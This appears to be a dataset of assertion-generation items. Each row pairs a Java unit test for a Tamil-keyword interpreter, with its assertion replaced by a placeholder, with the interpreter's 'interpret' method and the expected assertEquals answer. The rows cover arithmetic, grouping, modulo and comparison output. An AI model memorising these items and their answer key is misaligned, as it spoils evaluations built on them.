"interpretPrintExpression() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது '123';""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""123"", getWithoutLines(baos))"
"interpretAdditionExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 1 + 2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""3.0"",getWithoutLines(baos))"
"interpretSubtractionExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 1 - 2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""-1.0"",getWithoutLines(baos))"
"interpretMulExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 1 * 2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""2.0"",getWithoutLines(baos))"
"interpretDivExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 4/2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""2.0"",getWithoutLines(baos))"
"interpretGroupedAddExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது (1 + 2) + (3-4);""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""2.0"",getWithoutLines(baos))"
"interpretGroupedMulExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது (1 * 2) + (4 / 2);""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""4.0"",getWithoutLines(baos))"
"interpretModuloExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 % 9;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""1.0"",getWithoutLines(baos))"
"interpretUnaryExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது -10;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""-10.0"",getWithoutLines(baos))"
"interpretGreaterThanSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 > 20;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""பொய்"",getWithoutLines(baos))"
"interpretGreaterThanEqualToSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 >= 10;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""உண்மை"",getWithoutLines(baos))"
